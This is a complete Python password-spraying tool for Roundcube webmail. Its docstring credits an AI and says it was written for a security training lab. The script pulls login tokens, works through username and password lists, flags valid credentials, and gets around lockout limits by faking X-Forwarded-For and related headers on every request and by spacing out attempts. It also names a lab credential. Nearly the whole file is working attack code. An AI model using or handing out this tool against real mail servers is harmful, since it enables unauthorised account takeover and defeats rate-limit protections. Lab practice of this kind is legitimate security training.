#!/usr/bin/env python3
"""
script by claudi ai for hacksmarter lab https://www.hacksmarter.org/courses/27b0ac4a-5e03-4e43-afae-7c730b7b6263
roundcube_spray.py -- Roundcube password spray, rate-limit aware

Confirmed on this target: an ISOLATED login with correct creds succeeds (302),
but a BURST of attempts -- each with its own fresh session -- returns 401 for
every password, including the correct one. Fresh cookies don't help, so the
lockout is keyed on IP or username, not the session. A throttled 401 is
indistinguishable from a wrong-password 401, so the correct password just
disappears into the noise.

Two counters, both built in:

  1) --spoof-ip (default ON): rotate X-Forwarded-For / X-Real-IP per request.
     If the limiter trusts a forwarded header (common when Roundcube is behind
     Apache/nginx), every attempt looks like a new client and it never trips.
     Harmless no-op if the header isn't trusted.

  2) --delay + --jitter: if it's a real network/IP limit, stay under the
     threshold. Use the known-good creds as a probe to find a safe rate:
         --test maria:1qaz2wsx      # 302 = you're clear, 401 = throttled

Authorised testing / CTF use only.
"""

import argparse
import random
import re
import sys
import time

import requests

_TOKEN_TAG = re.compile(r'<input[^>]*_token[^>]*>', re.I)
_VALUE = re.compile(r'value="([^"]+)"', re.I)
_TOKEN_DIRECT = re.compile(r'name="_token"\s+value="([^"]+)"', re.I)
UA = "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/128.0"


def extract_token(html):
    m = _TOKEN_DIRECT.search(html)
    if m:
        return m.group(1)
    tag = _TOKEN_TAG.search(html)
    if tag:
        v = _VALUE.search(tag.group(0))
        if v:
            return v.group(1)
    return None


def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def new_session(spoof):
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    if spoof:
        ip = rand_ip()
        s.headers.update({
            "X-Forwarded-For": ip, "X-Real-IP": ip,
            "X-Client-IP": ip, "X-Forwarded": f"for={ip}",
            "Forwarded": f"for={ip}", "Client-IP": ip,
        })
    return s


def attempt_once(base, user, password, timezone, timeout, spoof, verbose=False):
    s = new_session(spoof)
    g = s.get(f"{base}/?_task=login", timeout=timeout, allow_redirects=True)
    token = extract_token(g.text)
    if not token:
        return False, {"error": "no _token", "status": g.status_code}

    data = {
        "_token": token, "_task": "login", "_action": "login",
        "_timezone": timezone, "_url": "", "_user": user, "_pass": password,
    }
    r = s.post(f"{base}/?_task=login&_action=login",
               data=data, timeout=timeout, allow_redirects=False)

    loc = r.headers.get("Location", "")
    sessauth = r.cookies.get("roundcube_sessauth", "")
    ok = ((r.status_code in (301, 302, 303, 307, 308) and "_task=mail" in loc)
          or (bool(sessauth) and sessauth not in ("-del-", "deleted", "")))
    info = {"status": r.status_code, "location": loc, "sessauth": sessauth}
    if verbose:
        print(f"    GET  -> {g.status_code}, token={token[:12]}...")
        print(f"    POST -> {r.status_code}   Location: {loc or '(none)'}")
        print(f"    sessauth -> {sessauth or '(none)'}")
    return ok, info


def try_credential(base, user, password, tz, timeout, retries, spoof, verbose=False):
    for _ in range(retries):
        try:
            return attempt_once(base, user, password, tz, timeout, spoof, verbose)
        except requests.exceptions.Timeout:
            time.sleep(1.5)
        except requests.RequestException as e:
            if verbose:
                print(f"    request error: {e}")
            time.sleep(1.0)
    return None, {"error": "timeouts"}


def load_lines(path):
    with open(path, encoding="utf-8", errors="replace") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]


def sleep_jitter(delay, jitter):
    time.sleep(max(0.0, delay + random.uniform(-jitter, jitter)))


def main():
    ap = argparse.ArgumentParser(description="Roundcube password spray (rate-limit aware)")
    ap.add_argument("base")
    ap.add_argument("passwords")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--users")
    g.add_argument("-U", "--userlist")
    ap.add_argument("--timezone", default="Africa/Johannesburg")
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--jitter", type=float, default=0.5, help="+/- randomness on delay")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--no-spoof-ip", dest="spoof", action="store_false",
                    help="disable X-Forwarded-For rotation")
    ap.add_argument("--test", metavar="USER:PASS",
                    help="one verbose attempt then exit (throttle probe)")
    ap.add_argument("--stop-on-first", action="store_true")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    if args.test:
        tu, _, tp = args.test.partition(":")
        print(f"[*] TEST {tu}:{tp}  spoof_ip={args.spoof}")
        ok, info = try_credential(base, tu, tp, args.timezone, args.timeout,
                                  args.retries, args.spoof, verbose=True)
        print(f"[{'+' if ok else '-'}] {'SUCCESS' if ok else 'fail'}  {info}")
        return

    users = ([u.strip() for u in args.users.split(",") if u.strip()]
             if args.users else load_lines(args.userlist))
    passwords = load_lines(args.passwords)
    print(f"[*] {len(users)}u x {len(passwords)}p  spoof_ip={args.spoof} "
          f"delay={args.delay}+/-{args.jitter}s")

    found, unverified, tried = [], [], 0
    try:
        for password in passwords:
            for user in users:
                tried += 1
                ok, info = try_credential(base, user, password, args.timezone,
                                          args.timeout, args.retries, args.spoof)
                if ok:
                    print(f"\n[+] VALID: {user}:{password}")
                    found.append((user, password))
                    if args.stop_on_first:
                        raise SystemExit
                elif ok is None:
                    unverified.append((user, password))
                    print(f"\n[!] UNVERIFIED (timeouts): {user}:{password}")
                else:
                    sys.stdout.write(f"\r[.] {tried} [{info.get('status')}] "
                                     f"{user}:{password}        ")
                    sys.stdout.flush()
                sleep_jitter(args.delay, args.jitter)
    except (KeyboardInterrupt, SystemExit):
        pass

    print()
    for label, lst in (("valid", found), ("unverified", unverified)):
        if lst:
            print(f"[*] {label}:")
            for u, p in lst:
                print(f"    {u}:{p}")
    if not found and not unverified:
        print("[-] no valid password found -- if all were 401, you're being "
              "rate-limited; try --test with known-good creds to find a safe --delay")


if __name__ == "__main__":
    main()
